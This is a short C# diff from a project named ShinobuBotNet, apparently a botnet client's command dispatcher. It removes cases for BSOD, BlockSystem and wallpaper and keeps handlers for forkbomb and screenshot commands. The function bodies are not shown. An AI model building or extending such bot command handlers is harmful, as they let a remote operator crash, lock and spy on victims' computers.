@@ -90,20 +90,8 @@ namespace ShinobuBotNet
                     functions.ping();
                     break;
 
-                case "BSOD":
-                    functions.BSOD();
-                    break;
-
                 case "forkbomb":
                     functions.forkbomb();
-                    break;
-
-                case "BlockSystem":
-                    functions.BlockSystem(CMD.ComContent);
-                    break;
-
-                case "wallpaper":
-                    functions.wallpaper(CMD.ComContent);
                     break;
 
                 case "screnshot":
